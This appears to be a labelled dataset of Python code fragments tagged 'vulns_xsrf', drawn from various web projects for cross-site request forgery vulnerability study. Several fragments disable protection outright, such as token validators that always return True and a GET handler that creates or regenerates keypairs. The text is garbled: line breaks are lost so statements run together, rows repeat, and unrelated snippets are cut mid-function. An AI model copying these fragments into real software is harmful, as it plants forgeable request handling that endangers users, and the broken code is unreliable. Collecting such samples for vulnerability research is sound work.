"    def modhash(self, rand=None, test=False):        return modhash(self, rand = rand, test = test)        return valid_hash(self, hash)",vulns_xsrf
"from validator import validate, VUser, VRequired, VMeetup, VEditMeetup, VFloat, ValueOrBlank, ValidIP, VMenu, VCreateMeetup",vulns_xsrf
        pass,vulns_xsrf
"def modhash(user, rand = None, test = False):    return user.namedef valid_hash(user, hash):    return True",vulns_xsrf
"from r2.lib.utils        import modhash, valid_hash, randstr ",vulns_xsrf
"    def modhash(self, rand=None, test=False):        return modhash(self, rand = rand, test = test)        return valid_hash(self, hash)",vulns_xsrf
"from validator import validate, VUser, VRequired, VMeetup, VEditMeetup, VFloat, ValueOrBlank, ValidIP, VMenu, VCreateMeetup",vulns_xsrf
"        sort = self.get_argument('sort', 'desc')",vulns_xsrf
        sort_by_obj = desc(by_obj) if sort == 'desc' else asc(by_obj),vulns_xsrf
        NPOOL = []        TOTAL_POOL = settings.NETWORK_POOL[0]        if not TOTAL_POOL: return,vulns_xsrf
"        ajax = self.get_argument('ajax', False)        if ajax:            x, y = template_name.split('.')            template_name = '.'.join([x,'ajax'])",vulns_xsrf
"            AJAX = ajax,",vulns_xsrf
        pass,vulns_xsrf
"def modhash(user, rand = None, test = False):    return user.namedef valid_hash(user, hash):    return True",vulns_xsrf
"from r2.lib.utils        import modhash, valid_hash, randstr ",vulns_xsrf
"    def modhash(self, rand=None, test=False):        return modhash(self, rand = rand, test = test)        return valid_hash(self, hash)",vulns_xsrf
"from validator import validate, VUser, VRequired, VMeetup, VEditMeetup, VFloat, ValueOrBlank, ValidIP, VMenu, VCreateMeetup",vulns_xsrf
"  return db.GqlQuery(""SELECT * FROM LoginInformation WHERE user_id = :1"", users.get_current_user.user_id()).get()",vulns_xsrf
    if user:,vulns_xsrf
    if user:,vulns_xsrf
    if user:,vulns_xsrf
def check_authorization(request):  if request.user.is_staff or request.user.is_superuser:    return True  keystr = request.REQUEST.get('api_key'),vulns_xsrf
"  def _check_token(request, *args, **kwargs):    check_authorization(request)    return viewfunc(request, *args, **kwargs)  return wraps(viewfunc)(_check_token)",vulns_xsrf
"  ALLOWED_PATHS = (      '/accounts/login/',      '/admin/',      '/site_media/',  )  def _path_allowed(self, path):    for p in self.ALLOWED_PATHS:      if path.startswith(p):        return True    return False",vulns_xsrf
    if self._path_allowed(request.path):,vulns_xsrf
def check_authorization(request):  if request.user.is_staff or request.user.is_superuser:    return True  keystr = request.REQUEST.get('api_key'),vulns_xsrf
"  def _check_token(request, *args, **kwargs):    check_authorization(request)    return viewfunc(request, *args, **kwargs)  return wraps(viewfunc)(_check_token)",vulns_xsrf
"  ALLOWED_PATHS = (      '/accounts/login/',      '/admin/',      '/site_media/',  )  def _path_allowed(self, path):    for p in self.ALLOWED_PATHS:      if path.startswith(p):        return True    return False",vulns_xsrf
    if self._path_allowed(request.path):,vulns_xsrf
"from flask import abort, request, g",vulns_xsrf
"                    return f(*args, **kwargs)",vulns_xsrf
"    logging.info('Initializing {} user authenticator'.format(module.auth_type))    return module(*args, **kwargs)",vulns_xsrf
        session['XSRF-TOKEN'] = '{0:x}'.format(            random.SystemRandom().getrandbits(160)        ),vulns_xsrf
"  version = os.environ['CURRENT_VERSION_ID']      str(version),",vulns_xsrf
            method='POST'):,vulns_xsrf
"        url_response = urllib2.urlopen(request, timeout=URL_OPEN_TIMEOUT).read()        url_response = urllib2.urlopen(url, encoded_data,                                       timeout=URL_OPEN_TIMEOUT).read()        url_response = urllib2.urlopen(url, timeout=URL_OPEN_TIMEOUT).read()",vulns_xsrf
"    url_helper.urllib2.urlopen(mox.StrContains(url),",vulns_xsrf
"    url_helper.urllib2.urlopen(url, mox.IgnoreArg(),                               timeout=mox.IgnoreArg()).AndReturn(                                   StringIO.StringIO(response))",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(    url_helper.urllib2.urlopen(mox.IgnoreArg(), mox.IgnoreArg(),",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndReturn(",vulns_xsrf
"          mox.IgnoreArg(), encoded_data, timeout=mox.IgnoreArg()).AndRaise(",vulns_xsrf
"    url_helper.urllib2.urlopen(mox.StrContains(url), mox.IgnoreArg(),",vulns_xsrf
"  version = os.environ['CURRENT_VERSION_ID']      str(version),",vulns_xsrf
            method='POST'):,vulns_xsrf
"        url_response = urllib2.urlopen(request, timeout=URL_OPEN_TIMEOUT).read()        url_response = urllib2.urlopen(url, encoded_data,                                       timeout=URL_OPEN_TIMEOUT).read()        url_response = urllib2.urlopen(url, timeout=URL_OPEN_TIMEOUT).read()",vulns_xsrf
"    url_helper.urllib2.urlopen(mox.StrContains(url),",vulns_xsrf
"    url_helper.urllib2.urlopen(url, mox.IgnoreArg(),                               timeout=mox.IgnoreArg()).AndReturn(                                   StringIO.StringIO(response))",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(    url_helper.urllib2.urlopen(mox.IgnoreArg(), mox.IgnoreArg(),",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(",vulns_xsrf
"        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndRaise(        mox.IgnoreArg(), mox.IgnoreArg(), timeout=mox.IgnoreArg()).AndReturn(",vulns_xsrf
"          mox.IgnoreArg(), encoded_data, timeout=mox.IgnoreArg()).AndRaise(",vulns_xsrf
"    url_helper.urllib2.urlopen(mox.StrContains(url), mox.IgnoreArg(),",vulns_xsrf
"def csrf_protect():        token = session.pop('_csrf_token', None)        if not token or token != request.form.get('_csrf_token'):            abort(403)        else: ",vulns_xsrf
"from django.shortcuts import render, redirect",vulns_xsrf
"    return render(request, 'index.html')",vulns_xsrf
    if request.get('token'):        return check_token(request.get('token')),vulns_xsrf
"        ' (token=%r, user=%r)' % (request.get('token'), user and user.email()))",vulns_xsrf
from access import check_user_role,vulns_xsrf
"            facility=self.facility, fields=fields,        logging.info(""record by user: %s""%users.get_current_user())",vulns_xsrf
from Tkinter import *,vulns_xsrf
"            self.error_window, text=error_message, width=500)",vulns_xsrf
"from cms import config, ServiceCoord, get_service_addressfrom cmstestsuite.web.CWSRequests import HomepageRequest, LoginRequest, \",vulns_xsrf
        for i in xrange(sleep_num):,vulns_xsrf
"        self.do_step(LoginRequest(self.browser,                                  self.username,                                  self.password,                                  base_url=self.base_url))",vulns_xsrf
"        help=""base URL for placing HTTP requests"")",vulns_xsrf
    finished = False    while not finished:        for actor in actors:            actor.join(),vulns_xsrf
"AWS_BASE_URL = ""http://localhost:8889/""CWS_BASE_URL = ""http://localhost:8888/""",vulns_xsrf
"    return browser.do_request(AWS_BASE_URL + path, args, files)",vulns_xsrf
"        self.url = ""%ssubmission/%s"" % (self.base_url, submission_id)",vulns_xsrf
"        self.url = ""%suser_test/%s"" % (self.base_url, user_test_id)",vulns_xsrf
"        self.url = ""%stasks/%s/description"" % (self.base_url, task_id)",vulns_xsrf
"        self.url = ""%stasks/%s/statements/%s"" % (self.base_url,                                                 task_id, language_code)",vulns_xsrf
"        self.url = ""%stasks/%s/submit"" % (self.base_url, task[1])",vulns_xsrf
"        self.url = ""%stasks/%s/test"" % (self.base_url, task[1])",vulns_xsrf
"        self.url = ""%stasks/%s/submissions/%s/token"" % (self.base_url,                                                        task[1],                                                        submission_num)",vulns_xsrf
"        self.url = ""%stasks/%s/submit"" % (self.base_url, task[1])",vulns_xsrf
        response = self.session.get(url)        for cookie in response.cookies:,vulns_xsrf
"        """"""Open an URL in a mechanize browser, optionally passing the        specified data and files as POST arguments.        browser (mechanize.Browser): the browser to use.",vulns_xsrf
"        self.url = '%slogin' % self.base_url                     'password': self.password,                     'next': '/'}",vulns_xsrf
"from cms import config, ServiceCoord, get_service_addressfrom cmstestsuite.web.CWSRequests import HomepageRequest, LoginRequest, \",vulns_xsrf
        for i in xrange(sleep_num):,vulns_xsrf
"        self.do_step(LoginRequest(self.browser,                                  self.username,                                  self.password,                                  base_url=self.base_url))",vulns_xsrf
"        help=""base URL for placing HTTP requests"")",vulns_xsrf
    finished = False    while not finished:        for actor in actors:            actor.join(),vulns_xsrf
"AWS_BASE_URL = ""http://localhost:8889/""CWS_BASE_URL = ""http://localhost:8888/""",vulns_xsrf
"    return browser.do_request(AWS_BASE_URL + path, args, files)",vulns_xsrf
"        self.url = ""%ssubmission/%s"" % (self.base_url, submission_id)",vulns_xsrf
"        self.url = ""%suser_test/%s"" % (self.base_url, user_test_id)",vulns_xsrf
"        self.url = ""%stasks/%s/description"" % (self.base_url, task_id)",vulns_xsrf
"        self.url = ""%stasks/%s/statements/%s"" % (self.base_url,                                                 task_id, language_code)",vulns_xsrf
"        self.url = ""%stasks/%s/submit"" % (self.base_url, task[1])",vulns_xsrf
"        self.url = ""%stasks/%s/test"" % (self.base_url, task[1])",vulns_xsrf
"        self.url = ""%stasks/%s/submissions/%s/token"" % (self.base_url,                                                        task[1],                                                        submission_num)",vulns_xsrf
"        self.url = ""%stasks/%s/submit"" % (self.base_url, task[1])",vulns_xsrf
        response = self.session.get(url)        for cookie in response.cookies:,vulns_xsrf
"        """"""Open an URL in a mechanize browser, optionally passing the        specified data and files as POST arguments.        browser (mechanize.Browser): the browser to use.",vulns_xsrf
"        self.url = '%slogin' % self.base_url                     'password': self.password,                     'next': '/'}",vulns_xsrf
"from cms import config, ServiceCoord, get_service_addressfrom cmstestsuite.web.CWSRequests import HomepageRequest, LoginRequest, \",vulns_xsrf
        for i in xrange(sleep_num):,vulns_xsrf
"        self.do_step(LoginRequest(self.browser,                                  self.username,                                  self.password,                                  base_url=self.base_url))",vulns_xsrf
"        help=""base URL for placing HTTP requests"")",vulns_xsrf
    finished = False    while not finished:        for actor in actors:            actor.join(),vulns_xsrf
"AWS_BASE_URL = ""http://localhost:8889/""CWS_BASE_URL = ""http://localhost:8888/""",vulns_xsrf
"    return browser.do_request(AWS_BASE_URL + path, args, files)",vulns_xsrf
"        self.url = ""%ssubmission/%s"" % (self.base_url, submission_id)",vulns_xsrf
"        self.url = ""%suser_test/%s"" % (self.base_url, user_test_id)",vulns_xsrf
"        self.url = ""%stasks/%s/description"" % (self.base_url, task_id)",vulns_xsrf
"        self.url = ""%stasks/%s/statements/%s"" % (self.base_url,                                                 task_id, language_code)",vulns_xsrf
"        self.url = ""%stasks/%s/submit"" % (self.base_url, task[1])",vulns_xsrf
"        self.url = ""%stasks/%s/test"" % (self.base_url, task[1])",vulns_xsrf
"        self.url = ""%stasks/%s/submissions/%s/token"" % (self.base_url,                                                        task[1],                                                        submission_num)",vulns_xsrf
"        self.url = ""%stasks/%s/submit"" % (self.base_url, task[1])",vulns_xsrf
        response = self.session.get(url)        for cookie in response.cookies:,vulns_xsrf
"        """"""Open an URL in a mechanize browser, optionally passing the        specified data and files as POST arguments.        browser (mechanize.Browser): the browser to use.",vulns_xsrf
"        self.url = '%slogin' % self.base_url                     'password': self.password,                     'next': '/'}",vulns_xsrf
"    if flask.session.get(""XSRF-TOKEN"") is None:",vulns_xsrf
from django.http import HttpResponsefrom django.template.defaultfilters import slugify,vulns_xsrf
"@urls.registerclass Keypair(generic.View):    url_regex = r'nova/keypairs/(?P<keypair_name>.+)/$'    def get(self, request, keypair_name):        """"""Creates a new keypair and associates it to the current project.        * Since the response for this endpoint creates a new keypair and          is not idempotent, it normally would be represented by a POST HTTP          request. However, this solution was adopted as it          would support automatic file download across browsers.        :param keypair_name: the name to associate the keypair to        :param regenerate: (optional) if set to the string 'true',            replaces the existing keypair with a new keypair        This returns the new keypair object on success.        """"""        try:            regenerate = request.GET.get('regenerate') == 'true'            if regenerate:                api.nova.keypair_delete(request, keypair_name)            keypair = api.nova.keypair_create(request, keypair_name)        except exceptions.Conflict:            return HttpResponse(status=409)        except Exception:            return HttpResponse(status=500)        else:            response = HttpResponse(content_type='application/binary')            response['Content-Disposition'] = ('attachment; filename=%s.pem'                                               % slugify(keypair_name))            response.write(keypair.private_key)            response['Content-Length'] = str(len(response.content))            return response",vulns_xsrf
"class CreateKeypair(forms.SelfHandlingForm):    name = forms.RegexField(max_length=255,                            label=_(""Key Pair Name""),                            regex=KEYPAIR_NAME_REGEX,                            error_messages=KEYPAIR_ERROR_MESSAGES)    def handle(self, request, data):        return True  # We just redirect to the download view.    def clean(self):        cleaned_data = super(CreateKeypair, self).clean()        name = cleaned_data.get('name')        try:            keypairs = api.nova.keypair_list(self.request)        except Exception:            exceptions.handle(self.request, ignore=True)            keypairs = []        if name in [keypair.name for keypair in keypairs]:            error_msg = _(""The name is already in use."")            self._errors['name'] = self.error_class([error_msg])        return cleaned_data",vulns_xsrf
"class CreateKeyPair(QuotaKeypairMixin, tables.LinkAction):    name = ""create""    url = ""horizon:project:key_pairs:create""    classes = (""ajax-modal"",)        if super(CreateKeyPair, self).allowed(request, keypair):",vulns_xsrf
"        table_actions = (CreateKeyPair, ImportKeyPair, DeleteKeyPairs,",vulns_xsrf
def find_free_port():  port = 8080,vulns_xsrf
      self.test_server.poll()      if self.test_server.returncode is not None:        raise Failure(            'Test GAE instance failed early on port %s' %            self.port)      time.sleep(0.001),vulns_xsrf
"  def get(self, suburl):    request = urllib2.Request(self.url + suburl)  def post(self, suburl, data):    request = urllib2.Request(self.url + suburl, urllib.urlencode(data))",vulns_xsrf
      self.get('_ah/login?email=%s&admin=%r&action=Login&continue=/' % (,vulns_xsrf
"    result = self.post('_ah/admin/interactive/execute', data)    match = re.search(        re.escape(r'<pre id=""output"">') + r'(.*?)' +        re.escape('</pre>\n</body>\n</html>\n'),        result,        re.DOTALL)    return match.group(1)      interactive = self.get(          '_ah/login?email=georges%40example.com&admin=True&action=Login&'          'continue=/_ah/admin/interactive')      self._xsrf_token = re.search(          r'name=""xsrf_token"" value=""(.*?)""/>', interactive).group(1)",vulns_xsrf
from google.appengine.api import users,vulns_xsrf
    params['url'] = data.url,vulns_xsrf
"class AdminDispatch(common.BaseHandler):    if not users.get_current_user():      self.redirect(users.create_login_url(self.request.url))      return    if not users.is_current_user_admin():      self.response.set_status(403)      return    if not users.is_current_user_admin():      self.response.set_status(403)      returnadmin_handlers = [    (r'/admin/(.*)', AdminDispatch),]admin = webapp2.WSGIApplication(admin_handlers, debug=True)",vulns_xsrf
"  def Update(self, user, is_admin, **kwargs):",vulns_xsrf
        'updated_ts': response.json_body.get('updated_ts'),vulns_xsrf
        'updated_ts': response.json_body.get('updated_ts'),vulns_xsrf
  def testPostConfigurationSettings(self):,vulns_xsrf
        'updated_ts': response.json_body.get('updated_ts'),vulns_xsrf
from google.appengine.api import users,vulns_xsrf
  if (not users.is_current_user_admin() or,vulns_xsrf
  if not suspected_cls:    return [],vulns_xsrf
    return users.is_current_user_admin(),vulns_xsrf
"    """"""Triggers analysis of a build failure on demand and return current result.    Serve HTML page or JSON result as requested.          'Url ""%s"" is not pointing to a build.' % url, 501)    analysis = None    if not (waterfall_config.MasterIsSupported(master_name) or            users.is_current_user_admin()):      analysis = WfAnalysis.Get(master_name, builder_name, build_number)      if not analysis:        return BaseHandler.CreateError(            'Master ""%s"" is not supported yet.' % master_name, 501)      force = (users.is_current_user_admin() and               self.request.get('force') == '1')      build = build_util.GetBuildInfo(master_name, builder_name, build_number)      if not build:            'Can\'t get information about build ""%s/%s/%s"".' % (              master_name, builder_name, build_number), 501)      build_completed = build.completed      if not build_completed and force:            'Can\'t rerun an incomplete build ""%s/%s/%s"".' % (                master_name, builder_name, build_number), 501)      analysis = build_failure_analysis_pipelines.ScheduleAnalysisIfNeeded(          master_name, builder_name, build_number,          build_completed=build_completed, force=force,          queue_name=constants.WATERFALL_ANALYSIS_QUEUE)",vulns_xsrf
  def HandlePost(self):  # pragma: no cover    return self.HandleGet(),vulns_xsrf
  def testInvalidBuildUrl(self):        re.compile('.*501 Not Implemented.*Url &#34;%s&#34; '  def testNonAdminCanViewAnalysisOfFailureOnUnsupportedMaster(self):,vulns_xsrf
"    self.assertEqual(0, len(self.taskqueue_stub.get_filtered_tasks()))  def testNonAdminCannotRequestAnalysisOfFailureOnUnsupportedMaster(self):        self.test_app.get, '/failure', params={'url': build_url})  @mock.patch.object(build_util, 'GetBuildInfo', return_value=None)  def testCannotGetBuildInfo(self, _):    self.mock_current_user(user_email='test@chromium.org', is_admin=True)",vulns_xsrf
"        self.test_app.get, '/failure', params={'url': build_url})  def testCannotRerunIncompleteBuild(self, mock_fn):    master_name = 'm2'",vulns_xsrf
"    self.mock_current_user(user_email='test@chromium.org', is_admin=True)        re.compile('.*501 Not Implemented.*Can&#39;t rerun an incomplete'                   ' build &#34;%s/%s/%s&#34;.*' % (        self.test_app.get, '/failure', params={'url': build_url, 'force': '1'})  def testAdminCanRequestAnalysisOfFailureOnUnsupportedMaster(self, mock_fn):    master_name = 'm2'",vulns_xsrf
"    response = self.test_app.get('/failure', params={'url': build_url})    self.assertEquals(200, response.status_int)  def testAnyoneCanRequestAnalysisOfFailureOnSupportedMaster(self, mock_fn):",vulns_xsrf
"    response = self.test_app.get('/failure', params={'url': build_url})    self.assertEquals(200, response.status_int)    self.assertEqual(1, len(self.taskqueue_stub.get_filtered_tasks()))",vulns_xsrf
  def HandleGet(self):    return self.HandlePost(),vulns_xsrf
  if analysis.suspected_flake_build_number is None:,vulns_xsrf
"  def HandleGet(self):    key = self.request.get('key')    if key:      analysis = ndb.Key(urlsafe=key).get()      if not analysis:  # pragma: no cover        return self.CreateError('Analysis of flake is not found', 404)    else:      build_url = self.request.get('url', '').strip()      build_info = buildbot.ParseBuildUrl(build_url)      if not build_info:  # pragma: no cover        return self.CreateError('Unknown build info!', 400)      master_name, builder_name, build_number = build_info      step_name = self.request.get('step_name', '').strip()      test_name = self.request.get('test_name', '').strip()      bug_id = self.request.get('bug_id', '').strip()      error = self._ValidateInput(step_name, test_name, bug_id)      if error:  # pragma: no cover        return error      build_number = int(build_number)      bug_id = int(bug_id) if bug_id else None      user_email = auth_util.GetUserEmail()      is_admin = auth_util.IsCurrentUserAdmin()      request = FlakeAnalysisRequest.Create(test_name, False, bug_id)      request.AddBuildStep(master_name, builder_name, build_number, step_name,                           time_util.GetUTCNow())      scheduled = flake_analysis_service.ScheduleAnalysisForFlake(          request, user_email, is_admin, triggering_sources.FINDIT_UI)      analysis = MasterFlakeAnalysis.GetVersion(          master_name, builder_name, build_number, step_name, test_name)      if not analysis:        if scheduled is None:          return {              'template': 'error.html',              'data': {                  'error_message':                      ('You could schedule an analysis for flaky test only '                       'after you login with @google.com account.'),              },              'return_code': 401,          }        request = FlakeAnalysisRequest.GetVersion(key=test_name)        if not (request and request.analyses):          return {              'template': 'error.html',              'data': {                  'error_message': (                      'Flake analysis is not supported for this request. Either'                      ' the build step may not be supported or the test is not '                      'swarmed.'),              },              'return_code': 400,          }        analysis = request.FindMatchingAnalysisForConfiguration(            master_name, builder_name)        if not analysis:  # pragma: no cover          logging.error('Flake analysis was deleted unexpectedly!')          return {              'template': 'error.html',              'data': {                  'error_message': 'Flake analysis was deleted unexpectedly!',              },              'return_code': 400          }",vulns_xsrf
"    if analysis.status != analysis_status.PENDING:      data['duration'] = time_util.FormatDuration(          analysis.start_time,          analysis.end_time or time_util.GetUTCNow())",vulns_xsrf
"  def testPost(self, _):    self.mock_current_user(user_email='test@google.com')    response = self.test_app.get('/waterfall/analyze_regression_range', params={        'lower_bound_commit_position': 1,        'upper_bound_commit_position': 2,        'iterations_to_rerun': 100,        'key': analysis.key.urlsafe()    })",vulns_xsrf
"  def testCorpUserCanScheduleANewAnalysis(self, _):",vulns_xsrf
"    self.mock_current_user(user_email='test@google.com')    response = self.test_app.get('/waterfall/flake', params={        'url': buildbot.CreateBuildUrl(master_name, builder_name, build_number),        'step_name': step_name,        'test_name': test_name})    self.assertEquals(200, response.status_int)  def testNoneCorpUserCanNotScheduleANewAnalysis(self):    self.assertRaisesRegexp(        webtest.app.AppError,        re.compile('.*401 Unauthorized.*',                   re.MULTILINE | re.DOTALL),        self.test_app.get,            'test_name': test_name        })",vulns_xsrf
    self.mock_current_user(user_email='test@example.com'),vulns_xsrf
"  def testUnauthorizedUserCannotScheduleNewAnalysis(self):    self.assertRaisesRegexp(        webtest.app.AppError,        re.compile('.*401 Unauthorized.*', re.MULTILINE | re.DOTALL),        self.test_app.get,        '/waterfall/flake',        params={            'url': buildbot.CreateBuildUrl(                master_name, builder_name, build_number),            'step_name': step_name,            'test_name': test_name,            'format': 'json'})  @mock.patch.object(check_flake, '_GetSuspectedFlakeInfo',                     return_value={                         'build_number': 100,                         'commit_position': 12345,                         'git_hash': 'a_git_hash',                         'triage_result': 0})  @mock.patch.object(check_flake, '_GetCoordinatesData',                     return_value=[[12345, 0.9, '1', 100, 'git_hash_2',                                    12344, 'git_hash_1']])  def testRequestExistingAnalysis(self, *_):    success_rate = 0.9    data_point = DataPoint()    data_point.build_number = build_number - 1    data_point.pass_rate = success_rate    previous_analysis.data_points.append(data_point)    previous_analysis.status = analysis_status.COMPLETED    previous_analysis.suspected_flake_build_number = 100    previous_analysis.request_time = datetime.datetime(2016, 10, 01, 12, 10, 00)    previous_analysis.start_time = datetime.datetime(2016, 10, 01, 12, 10, 05)    previous_analysis.end_time = datetime.datetime(2016, 10, 01, 13, 10, 00)    previous_analysis.algorithm_parameters = {'iterations_to_rerun': 100}",vulns_xsrf
"    self.mock_current_user(user_email='test@google.com')    response = self.test_app.get('/waterfall/flake', params={        'format': 'json'})        'key': previous_analysis.key.urlsafe(),        'analysis_status': STATUS_TO_DESCRIPTION.get(previous_analysis.status),",vulns_xsrf
"  def testRequestUnsupportedAnalysis(self, _):",vulns_xsrf
"    self.assertRaisesRegexp(        webtest.app.AppError,        re.compile('.*not supported.*', re.MULTILINE | re.DOTALL),        self.test_app.get,            'format': 'json'})",vulns_xsrf
"        'url': buildbot.CreateBuildUrl(master_name, builder_name, build_number),        'step_name': step_name,        'test_name': test_name,",vulns_xsrf
  def HandleGet(self):  # pragma: no cover,vulns_xsrf
  def HandlePost(self):  # pragma: no cover    return self.HandleGet(),vulns_xsrf
  def testSuccessfulTriage(self):    response = self.test_app.get(        'format': 'json',vulns_xsrf
  def HandleGet(self):  # pragma: no cover,vulns_xsrf
  def HandlePost(self):  # pragma: no cover    return self.HandleGet(),vulns_xsrf
  token_time = token_time or int(time.time()),vulns_xsrf
  now = now or int(time.time()),vulns_xsrf
  now = now or int(time.time()),vulns_xsrf
"  def testGenerateToken_DifferentTimesGetDifferentTokens(self):    test_time = int(time.time())    self.assertNotEqual(        xsrf.GenerateToken(111L, '/path', token_time=test_time),        xsrf.GenerateToken(111L, '/path', token_time=test_time + 1))",vulns_xsrf
"  def testValidateToken_Expiration(self):    test_time = int(time.time())    token = xsrf.GenerateToken(111L, '/path', token_time=test_time)    xsrf.ValidateToken(token, 111L, '/path', now=test_time)    xsrf.ValidateToken(token, 111L, '/path', now=test_time + 1)    xsrf.ValidateToken(        token, 111L, '/path', now=test_time + xsrf.TOKEN_TIMEOUT_SEC)      xsrf.ValidateToken, token, 11L, '/path',      now=test_time + xsrf.TOKEN_TIMEOUT_SEC + 1)",vulns_xsrf
TOKEN_GRANULARITY_MINUTES = 10 * framework_constants.SECS_PER_MINUTE,vulns_xsrf
    token_time: Time at which the token is generated in seconds since the        epoch.  This is used in validation and testing. Defaults to the        current time.,vulns_xsrf
"  token, user_id, servlet_path, now=None, timeout=TOKEN_TIMEOUT_SEC):    now: Time in seconds since th epoch.  Defaults to the current time.        It is explicitly specified only in tests.",vulns_xsrf
  now = now or GetRoundedTime(),vulns_xsrf
def TokenExpiresSec(now=None):  now = now or GetRoundedTime()  rounded = now - (now % TOKEN_GRANULARITY_MINUTES),vulns_xsrf
"      base_data['token_expires_sec'] = xsrf.TokenExpiresSec()      base_data['xhr_token'] = xsrf.GenerateToken(        mr.auth.user_id, xsrf.XHR_SERVLET_PATH)",vulns_xsrf
"  def testGenerateToken_AnonUserGetsNoToken(self):    self.assertEqual('', xsrf.GenerateToken(0L, '/path'))",vulns_xsrf
  if not user_id:    return ''  # Don't give tokens out to anonymous visitors.,vulns_xsrf
"  def xsrf_is_valid(self, body):    cnxn = sql.MonorailConnection()    token = body.get('token')    user = users.get_current_user()    email = user.email() if user else None    services = self.app.config.get('services')    auth = authdata.AuthData.FromEmail(cnxn, email, services, autocreate=False)    try:      xsrf.ValidateToken(token, auth.user_id, xsrf.XHR_SERVLET_PATH)      return True    except xsrf.TokenIncorrect:      return False",vulns_xsrf
"  def xsrf_is_valid(self, body):    cnxn = sql.MonorailConnection()    token = body.get('token')    user = users.get_current_user()    email = user.email() if user else None    services = self.app.config.get('services')    auth = authdata.AuthData.FromEmail(cnxn, email, services, autocreate=False)    try:      xsrf.ValidateToken(token, auth.user_id, xsrf.XHR_SERVLET_PATH)      return True    except xsrf.TokenIncorrect:      return False",vulns_xsrf
"    self.services = service_manager.Services()        'req', 'res', services=self.services)    mr = testing_helpers.MakeMonorailRequest()    mr.auth.user_id = 0                      self.servlet.GatherPageData, mr)",vulns_xsrf
      requester = auth.email if auth else self.GetRequester(request),vulns_xsrf
"      self.AssertBaseChecks(mc, request)",vulns_xsrf
"  def GetRequester(self, request):    if hasattr(request, 'trace') and request.trace.test_account:            'test_account only accepted in local_mode')      if not request.trace.test_account.endswith('@example.com'):      logging.info('Using test_account: %r' % request.trace.test_account)      return request.trace.test_account",vulns_xsrf
"  def AssertBaseChecks(self, mc, request):",vulns_xsrf
"    if request.trace.reason:      logging.info('Request reason: %r', request.trace.reason)    if request.trace.request_id:      logging.info('request_id: %r', request.trace.request_id)    self.AssertWhitelistedOrXSRF(mc, request)  def AssertWhitelistedOrXSRF(self, mc, request):",vulns_xsrf
"        request.trace.token, mc.auth.user_id, xsrf.XHR_SERVLET_PATH,",vulns_xsrf
"    self.request = UpdateSomethingRequest(        xsrf.GenerateToken(222L, xsrf.XHR_SERVLET_PATH), exc_class=None)",vulns_xsrf
"    self.assertIsNone(self.svcr.GetRequester(self.request))    self.assertEqual('user@example.com', self.svcr.GetRequester(self.request))    self.assertIsNone(self.svcr.GetRequester(self.request))    self.assertEqual('robot@example.com', self.svcr.GetRequester(self.request))    self.request.trace = testing_helpers.Blank(        test_account='test@example.com')      self.svcr.GetRequester(self.request)",vulns_xsrf
"      self.request.trace = testing_helpers.Blank(          test_account='test@example.com')          'test@example.com', self.svcr.GetRequester(self.request))      self.request.trace = testing_helpers.Blank(          test_account='test@anythingelse.com')        self.svcr.GetRequester(self.request)",vulns_xsrf
"        self.svcr.AssertBaseChecks, None, self.request)",vulns_xsrf
"        self.svcr.AssertBaseChecks(mc, self.request)      self.svcr.AssertBaseChecks(mc, self.request)",vulns_xsrf
"        self.svcr.AssertBaseChecks, mc, self.request)    self.svcr.AssertBaseChecks(mc, self.request)    self.svcr.AssertBaseChecks(mc, self.request)    self.svcr.AssertBaseChecks(mc, self.request)",vulns_xsrf
"      self.svcr.AssertWhitelistedOrXSRF(mc, self.request)    self.svcr.AssertWhitelistedOrXSRF(mc, self.request)",vulns_xsrf
"      self.svcr.AssertWhitelistedOrXSRF(mc, self.request)      self.svcr.AssertWhitelistedOrXSRF(mc, self.request)    self.svcr.AssertWhitelistedOrXSRF(mc, self.request)  def testAssertWhitelistedOrXSRF_XSRFToken(self, mock_get_client_id):",vulns_xsrf
"    self.svcr.AssertWhitelistedOrXSRF(mc, self.request)      self.svcr.AssertWhitelistedOrXSRF(mc, self.request)      self.svcr.AssertWhitelistedOrXSRF(mc, self.request)      self.svcr.AssertWhitelistedOrXSRF(mc, self.request)",vulns_xsrf
"      self.svcr.AssertWhitelistedOrXSRF(mc, self.request)    self.svcr.AssertWhitelistedOrXSRF(mc, self.request)",vulns_xsrf
"  def xsrf_is_valid(self, _body):    return True",vulns_xsrf
"    def check_xsrf_cookie(self):        """"""Check non-empty body on POST for XSRF        instead of checking the cookie for forms.        """"""        if self.request.method.upper() == 'POST' and not self.request.body:            raise web.HTTPError(400, ""POST requests must have a JSON body. If no content is needed, use '{}'."")",vulns_xsrf
        if self.token_authenticated:,vulns_xsrf
"        self.get(path, include_body=False)",vulns_xsrf
"        self.get(path, include_body=False)",vulns_xsrf
"        self.get(path, include_body=False)",vulns_xsrf
"      package_data={ 'allmydata': ['web/*.xhtml', 'web/*.css'] },",vulns_xsrf
"            ws = WebishServer(webport)            ws.allow_local_access(os.path.exists(os.path.join(self.basedir,                                  self.WEB_ALLOW_LOCAL_ACCESS_FILE)))            self.add_service(ws)",vulns_xsrf
            self.failUnless('To view your personal private non-shared' in res),vulns_xsrf
"        d.addCallback(lambda res:                      self.GET(""/vdrive/private"", followRedirect=True))        def _check4(res):            pass        d.addCallback(_check4)",vulns_xsrf
"from twisted.application import service, strports",vulns_xsrf
"            elif segments[1] == ""private"":                d = vdrive.get_private_root()                name = ""private vdrive""",vulns_xsrf
"        if IClient(ctx).getServiceNamed(""vdrive"").have_private_root():                       T.a(href=""vdrive/private"")[""Click Here!""],",vulns_xsrf
"    def __init__(self, webport, local_access=False):",vulns_xsrf
"def auth_url(app_id, canvas_url, perms=None):",vulns_xsrf
    print(table.table),vulns_xsrf
